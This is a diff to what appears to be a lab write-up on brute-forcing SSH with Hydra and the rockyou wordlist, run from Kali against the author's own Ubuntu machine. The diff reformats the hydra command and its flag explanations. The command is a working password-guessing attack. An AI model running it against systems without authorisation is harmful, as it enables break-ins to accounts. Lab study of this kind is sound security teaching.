@@ -43,13 +43,16 @@ It is a process that happens in three distinct phases.
    sudo systemctl start ssh`
 
 4. Opened kali linux terminal and entered the following command -
-   `hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<UBUNTU_IP>`
-   Hydra - Password cracking tool
+   ``` bash
+   hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<UBUNTU_IP>
+   ```
+   
+   *Hydra - Password cracking tool
    -l - Specifies the username
    -P - Specifies the password wordlist
    ssh:// - Target protocol (SSH)
    <target-ip> - IP address of the Ubuntu machine
-   -t 2 - Limits parallel login attempts this reduces system overload
+   -t 2 - Limits parallel login attempts this reduces system overload*
 
 6. The rockyou.txt was not found. To extract the file, the below commands were executed - 
    1. `ls /usr/share/wordlists/` - First, look at the files.
